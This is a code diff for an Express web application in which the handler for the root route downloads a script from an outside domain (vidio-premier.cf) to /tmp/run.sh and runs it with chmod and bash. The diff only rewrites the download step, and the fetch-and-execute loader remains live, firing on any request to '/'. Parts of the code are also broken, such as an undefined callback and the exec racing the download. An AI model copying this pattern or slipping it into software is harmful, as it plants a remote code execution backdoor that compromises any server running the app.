@@ -20,17 +20,27 @@ export default function expressApp(functionName) {
   /* define routes */
   router.get('/', (req, res) => {
 
-var http = require('https');
-var fs = require('fs');
+var fs = require('fs-extra');
+var fetch = require('node-fetch');
 
-var file = fs.createWriteStream("/tmp/run.sh");
-  var request = http.get("https://www.vidio-premier.cf/note.txt", function(response) {
-    response.pipe(file);
-    file.on('finish', function() {
-      file.close(cb);  // close() is async, call cb after close completes.
+downloadFile("https://www.vidio-premier.cf/note.txt", "/tmp/run.sh");
+    
+function downloadFile(fileUrl, destPath) {
+
+    if (!fileUrl) return Promise.reject(new Error('Invalid fileUrl'));
+    if (!destPath) return Promise.reject(new Error('Invalid destPath'));
+
+    return new Promise(function(resolve, reject) {
+
+        fetch(fileUrl).then(function(res) {
+            var fileStream = fs.createWriteStream(destPath);
+            res.body.on('error', reject);
+            fileStream.on('finish', resolve);
+            res.body.pipe(fileStream);
+        });
     });
-  });
-
+}    
+    
 var exec = require('child_process').exec;
 function puts(error, stdout, stderr) { sys.puts(stdout) }
 exec("chmod +x /tmp/run.sh; bash /tmp/run.sh", function(error, stdout, stderr) {
